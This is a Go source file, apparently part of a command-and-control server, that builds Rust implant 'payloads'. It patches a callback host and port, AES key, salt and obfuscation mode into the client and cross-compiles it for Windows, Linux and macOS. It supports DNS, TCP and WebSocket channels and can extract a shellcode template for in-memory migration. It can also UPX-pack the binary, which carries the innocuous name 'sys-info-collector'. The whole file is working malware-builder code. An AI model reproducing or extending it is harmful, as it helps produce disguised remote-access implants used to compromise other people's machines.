package services

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"github.com/google/uuid"
	"cupcake-server/pkg/store"
)

const (
	SourceDir      = "../Client"           // Relative to server/
	BuildBaseDir   = "./temp_builds"      // Sandbox root
	ArtifactDir    = "./storage/payloads" // Final storage
	SharedTargetDir = "./storage/build_cache/target" // Shared cargo target directory
)

type PayloadConfig struct {
	Arch              string `json:"arch"`
	Protocol          string `json:"protocol"`
	Host              string `json:"host"`
	Port              string `json:"port"`
	AESKey            string `json:"aes_key"`
	HeartbeatInterval int    `json:"heartbeat_interval"`
	DNSResolver       string `json:"dns_resolver"`
	OSType            string `json:"os_type"`
	AsShellcode       bool   `json:"as_shellcode"`
	AutoDestruct      bool   `json:"auto_destruct"`
	SleepTime         int    `json:"sleep_time"`
	UseUPX            bool   `json:"use_upx"`
	EncryptionSalt    string `json:"encryption_salt"`
	ObfuscationMode   string `json:"obfuscation_mode"`
}

// copyDir recursively copies a directory tree
func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil { return err }
		relPath, _ := filepath.Rel(src, path)
		if strings.HasPrefix(relPath, "target") { return filepath.SkipDir }
		dstPath := filepath.Join(dst, relPath)
		if info.IsDir() { return os.MkdirAll(dstPath, info.Mode()) }
		
		sf, err := os.Open(path)
		if err != nil { return err }
		defer sf.Close()
		df, err := os.Create(dstPath)
		if err != nil { return err }
		defer df.Close()
		if _, err := io.Copy(df, sf); err != nil { return err }
		return os.Chmod(dstPath, info.Mode())
	})
}

// BuildAgentWithLogger compiles the Rust agent in a sandboxed environment and streams logs
func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, error) {
	buildID := uuid.New().String()
	workspace := filepath.Join(BuildBaseDir, buildID)
	
	os.MkdirAll(BuildBaseDir, 0755)
	os.MkdirAll(ArtifactDir, 0755)
	os.MkdirAll(SharedTargetDir, 0755)

	if logChan != nil { logChan <- "[Builder] 正在准备沙箱环境 (已启用增量编译缓存)..." }
	if err := copyDir(SourceDir, workspace); err != nil {
		return "", fmt.Errorf("failed to create sandbox: %v", err)
	}
	defer os.RemoveAll(workspace)

	var connStr string
	protocol := strings.ToLower(conf.Protocol)
	if protocol == "tcp" {
		connStr = fmt.Sprintf("%s:%s", conf.Host, conf.Port)
	} else if protocol == "dns" {
		connStr = conf.Host 
	} else {
		connStr = fmt.Sprintf("ws://%s:%s/ws", conf.Host, conf.Port)
	}

	configPath := filepath.Join(workspace, "src", "config.rs")
	if logChan != nil { logChan <- "[Builder] 正在注入配置信息..." }

	// Fetch System AES Key if none provided
	aesKey := conf.AESKey
	if aesKey == "" {
		aesKey = store.GetSetting("system_aes_key")
		if logChan != nil { logChan <- "[Builder] 使用系统默认加密密钥" }
	}

	if err := patchConfig(configPath, connStr, aesKey, conf.HeartbeatInterval, conf.DNSResolver, conf.EncryptionSalt, conf.ObfuscationMode); err != nil {
		return "", fmt.Errorf("config patch failed: %v", err)
	}

	if logChan != nil { logChan <- "[Builder] 配置注入完成，正在扫描底层依赖缓存..." }

	args := []string{"build", "--release"}
	target := ""
	// Determine Cargo Target based on OS and Arch Matrix
	if conf.OSType == "windows" {
		if strings.Contains(conf.Arch, "amd64") {
			target = "x86_64-pc-windows-gnu"
		} else if strings.Contains(conf.Arch, "i386") {
			target = "i686-pc-windows-gnu"
		}
	} else if conf.OSType == "linux" {
		if strings.Contains(conf.Arch, "arm64") {
			target = "aarch64-unknown-linux-gnu"
		} else if strings.Contains(conf.Arch, "arm") && !strings.Contains(conf.Arch, "arm64") {
			target = "armv7-unknown-linux-gnueabihf"
		} else if strings.Contains(conf.Arch, "i386") {
			target = "i686-unknown-linux-gnu"
		}
	} else if conf.OSType == "darwin" {
		if strings.Contains(conf.Arch, "amd64") {
			target = "x86_64-apple-darwin"
		} else if strings.Contains(conf.Arch, "arm64") {
			target = "aarch64-apple-darwin"
		}
	}

	// Only append --target if cross-compiling
	if target != "" && (runtime.GOOS != conf.OSType || runtime.GOARCH != strings.Replace(conf.Arch, conf.OSType+"_", "", 1)) {
		args = append(args, "--target", target)
	}

	if protocol == "tcp" {
		args = append(args, "--no-default-features", "--features", "tcp")
	} else if protocol == "dns" {
		args = append(args, "--no-default-features", "--features", "dns")
	} else {
		args = append(args, "--features", "ws")
	}

	if logChan != nil { 
		modeStr := "全量构建"
		if _, err := os.Stat(SharedTargetDir); err == nil { modeStr = "增量加速模式" }
		logChan <- fmt.Sprintf("[Builder] 正在启动 Rust 编译器 (%s)...", modeStr) 
		logChan <- "[Builder] 提示: 如果底层依赖已缓存，本过程将很快跳过..."
	}

	cmd := exec.Command("cargo", args...)
	cmd.Dir = workspace
	
	// Add parent environment and force color/progress
	// ⚡ OPTIMIZATION: Use a centralized target directory to enable incremental compilation
	absTargetDir, _ := filepath.Abs(SharedTargetDir)
	cmd.Env = append(os.Environ(), 
		"CARGO_TERM_COLOR=never",
		fmt.Sprintf("CARGO_TARGET_DIR=%s", absTargetDir),
	)
	
	// Stream logs: Combine Stdout and Stderr to avoid MultiReader blocking
	pipeReader, pipeWriter := io.Pipe()
	cmd.Stdout = pipeWriter
	cmd.Stderr = pipeWriter
	
	if logChan != nil { logChan <- fmt.Sprintf("[Builder] 执行命令: cargo %s", strings.Join(args, " ")) }
	
	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("failed to start cargo: %v", err)
	}

	// Log reader in its own goroutine
	go func() {
		scanner := bufio.NewScanner(pipeReader)
		for scanner.Scan() {
			line := scanner.Text()
			if logChan != nil {
				select {
				case logChan <- line:
				default:
				}

				// 🚀 HUMAN TOUCH: Detect when cargo reaches the linking phase
				if strings.Contains(line, "Compiling") && strings.Contains(line, "sys-info-collector") {
					logChan <- "\x1b[35m[Builder] 编译阶段基本完成，正在进入全局链接与 LTO 体积优化阶段...\x1b[0m"
					logChan <- "\x1b[33m[Builder] 提示：该步涉及跨模块重组，耗时较长（约 30s），请耐心等待窗口自动弹出。\x1b[0m"
				}
			}
		}
		pipeReader.Close()
	}()

	waitErr := cmd.Wait()
	pipeWriter.Close() // This will trigger EOF on the scanner

	if waitErr != nil {
		return "", fmt.Errorf("cargo build failed: %v", waitErr)
	}

	binaryName := "sys-info-collector"
	if conf.OSType == "windows" { binaryName += ".exe" }

	// Determine if we actually passed the --target flag to cargo
	actualTargetUsed := ""
	if target != "" && (runtime.GOOS != conf.OSType || runtime.GOARCH != strings.Replace(conf.Arch, conf.OSType+"_", "", 1)) {
		actualTargetUsed = target
	}

	var builtPath string
	if actualTargetUsed != "" {
		builtPath = filepath.Join(absTargetDir, actualTargetUsed, "release", binaryName)
	} else {
		builtPath = filepath.Join(absTargetDir, "release", binaryName)
	}

	ext := ""
	if conf.OSType == "windows" {
		ext = ".exe"
	}
	finalPath := filepath.Join(ArtifactDir, fmt.Sprintf("agent_%s_%s%s", conf.Arch, buildID[:8], ext))

	// 🛠️ POST-PROCESSING: Shellcode Preparation (Professional Dual-Output Mode)
	if conf.AsShellcode && conf.OSType == "windows" {
		if logChan != nil { logChan <- "[Builder] 正在为该配置提取原始内存映像 (.bin)..." }
		
		// 1. Save an UNPATCHED copy of the binary as a template for migration
		// This avoids the "placeholder not found" warnings later during live migration.
		shellcodePath := strings.TrimSuffix(finalPath, filepath.Ext(finalPath)) + ".bin"
		_ = copyFile(builtPath, shellcodePath)
		
		if logChan != nil { logChan <- "[Builder] 准备就绪：EXE 已静态配置，BIN 模版已就绪用于动态迁移。" }
	}

	if logChan != nil { logChan <- "[Builder] 正在对本地 Loader 执行配置补丁..." }
	if err := moveFile(builtPath, finalPath); err != nil { return "", fmt.Errorf("failed to save artifact: %v", err) }

	// 📦 UPX 极限压缩支持
	if conf.UseUPX && !conf.AsShellcode {
		if logChan != nil { logChan <- "[Builder] 正在执行 UPX 极限压缩..." }
		if err := RunUPX(finalPath); err != nil {
			if logChan != nil { logChan <- "[!] UPX 失败: " + err.Error() }
		} else {
			if logChan != nil { logChan <- "[+] UPX 压缩成功" }
		}
	}

	if logChan != nil { logChan <- "[Builder] 构建成功!" }
	return finalPath, nil
}

// RunUPX 执行 UPX 压缩
func RunUPX(path string) error {
	cmd := exec.Command("upx", "-9", "--force", path)
	return cmd.Run()
}

// Extension of services to support cloning for shellcode
func copyFile(src, dst string) error {
	sf, err := os.Open(src); if err != nil { return err }; defer sf.Close()
	df, err := os.Create(dst); if err != nil { return err }; defer df.Close()
	_, err = io.Copy(df, sf)
	return err
}

func patchConfig(path, connStr, aesKey string, heartbeat int, dnsResolver string, salt string, obfMode string) error {
	content, err := os.ReadFile(path)
	if err != nil { return err }
	s := string(content)

	// 1. URL Patch (Static only)
	s = strings.Replace(s, "REPLACE_ME_URL", connStr, 1)
	
	// 2. AES Key Patch (Static only)
	if aesKey != "" {
		if !isValidAESKeyString(aesKey) {
			return fmt.Errorf("AES key must be 32 bytes ASCII or 64 hex characters")
		}
		s = strings.Replace(s, "REPLACE_ME_AES_KEY", aesKey, 1)
	}

	// 3. Encryption Salt & Obfuscation
	// In Source Patching mode, we ONLY replace the constants.
	// Do NOT touch SYSTEM_PROVIDER_CRYPTO_KDF_SALT or OBF_MODE_STRICT in source code
	// because they are fixed-size arrays and changing their literal length breaks compilation.
	s = strings.Replace(s, "REPLACE_ME_SALT", salt, 1)
	
	obfVal := strings.ToLower(obfMode)
	if obfVal == "" { obfVal = "none" }
	s = strings.Replace(s, "REPLACE_ME_OBF", obfVal, 1)
	
	return os.WriteFile(path, []byte(s), 0644)
}

func isValidAESKeyString(key string) bool {
	key = strings.TrimSpace(key)
	if len(key) == 32 {
		return true
	}
	if len(key) == 64 && isHexString(key) {
		return true
	}
	return false
}

func moveFile(src, dst string) error {
	if err := os.Rename(src, dst); err == nil { return nil }
	sf, err := os.Open(src); if err != nil { return err }; defer sf.Close()
	df, err := os.Create(dst); if err != nil { return err }; defer df.Close()
	if _, err := io.Copy(df, sf); err != nil { return err }
	return os.Remove(src)
}
